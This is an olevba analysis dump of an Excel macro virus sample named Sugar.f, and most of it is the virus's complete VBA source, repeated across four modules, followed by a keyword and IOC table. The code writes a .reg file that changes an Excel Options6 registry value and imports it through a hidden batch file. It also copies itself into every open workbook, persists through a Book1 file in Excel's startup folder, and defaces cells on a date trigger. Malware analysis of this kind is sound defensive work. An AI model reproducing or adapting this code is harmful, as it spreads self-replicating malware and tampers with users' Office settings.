olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Sugar.f-ab7ecdefb625e75a544c74a1c21bf6b3d6d090b9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Sugar.f-ab7ecdefb625e75a544c74a1c21bf6b3d6d090b9 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Sugar.f-ab7ecdefb625e75a544c74a1c21bf6b3d6d090b9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Sugar.f-ab7ecdefb625e75a544c74a1c21bf6b3d6d090b9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Sugar.f-ab7ecdefb625e75a544c74a1c21bf6b3d6d090b9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tb6.reg             |Executable file name                         |
|IOC       |TB6.REG             |Executable file name                         |
|IOC       |tb6.bat             |Executable file name                         |
|IOC       |TB6.BAT             |Executable file name                         |
+----------+--------------------+---------------------------------------------+
